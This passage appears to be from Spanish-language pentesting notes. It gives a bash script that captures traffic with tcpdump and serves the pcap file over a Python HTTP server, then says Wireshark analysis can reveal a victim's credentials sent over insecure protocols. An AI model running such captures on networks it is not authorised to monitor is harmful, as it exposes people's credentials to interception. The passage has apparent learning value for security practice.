Lo haríamos de la siguiente forma:
```bash
#!/bin/bash

# Configuración
INTERFAZ="eth0"        
ARCHIVO_DUMP="captura.pcap"
PUERTO_HTTP="80"

# Comando tcpdump
tcpdump -i $INTERFAZ -w $ARCHIVO_DUMP &

# Esperar unos segundos para asegurarte de que tcpdump haya comenzado la captura
sleep 5

# Levanta un servidor HTTP en Python
python3 -m http.server $PUERTO_HTTP &

sleep 30

proceso_tcpdump=$(pgrep tcpdump)
proceso_python=$(pgrep python3)

kill $proceso_tcpdump
kill $proceso_python

echo "Captura finalizada"
```
Levantamos el script:
![[Pasted image 20231225114847.png]]
Y nos habrá generado un archivo .pcap compartido por la red con python, que si lo analizamos con wireshark podemos interceptar credenciales si la víctima se ha logueado con un protocolo vulnerable:
![[Pasted image 20231225114925.png]]
![[Pasted image 20231225114936.png]]
